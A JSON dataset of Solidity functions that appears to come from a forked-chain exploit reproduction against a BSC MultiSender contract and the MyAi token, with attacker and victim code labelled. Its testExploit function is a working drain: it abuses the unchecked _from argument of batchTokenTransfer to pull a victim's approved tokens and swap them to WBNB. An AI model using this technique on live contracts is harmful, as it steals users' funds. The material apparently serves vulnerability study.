[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 29_554_344 - 1);\n        vm.label(address(WBNB), \"WBNB\");\n        vm.label(address(MyAi), \"MyAi\");\n        vm.label(address(MultiSender), \"MultiSender\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Attacker WBNB balance before attack\", WBNB.balanceOf(address(this)), 18);\n        MyAi.approve(address(PancakeRouter), type(uint256).max);\n        MyAi.approve(address(MultiSender), type(uint256).max);\n\n        address[] memory Attack = new address[](100);\n        for (uint256 i = 0; i < Attack.length; i++) {\n            Attack[i] = address(this);\n        }\n        uint256[] memory Token = new uint256[](100);\n        for (uint256 i = 0; i < Attack.length; i++) {\n            Token[i] = 999_999_999_999_400;\n        }\n\n        MultiSender.batchTokenTransfer{value: 1 ether}(\n            Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true\n        );\n        for (uint256 i = 0; i < 100; i++) {\n            TOKENToWBNB();\n        }\n        emit log_named_decimal_uint(\"Attacker WBNB balance before attack\", WBNB.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IMultiSender",
    "source_type": "victim_contract",
    "function_name": "batchTokenTransfer",
    "original_code": "    function batchTokenTransfer(\n        address _from,\n        address[] memory _address,\n        uint256[] memory _amounts,\n        address token,\n        uint256 totalAmount,\n        bool isToken\n    ) external payable {\n        require(\n            _address.length == _amounts.length,\n            \"address and amounts length mismatch\"\n        );\n        require(msg.value >= platformFees + devFees, \"send bnb for fees\");\n\n        if (msg.sender != platformWallet) {\n            transferBNB(platformWallet, platformFees);\n            transferBNB(devWallet, devFees);\n        }\n\n        if (isToken) {\n            tokenTransfer(_from, _address, _amounts, token, totalAmount);\n        } else {\n            require(msg.value >= totalAmount, \"require more bnb\");\n            bnbTransfer(_address, _amounts);\n        }\n\n        emit TransferBatch(_from, _address, _amounts);\n    }\n\n",
    "description": ""
  }
]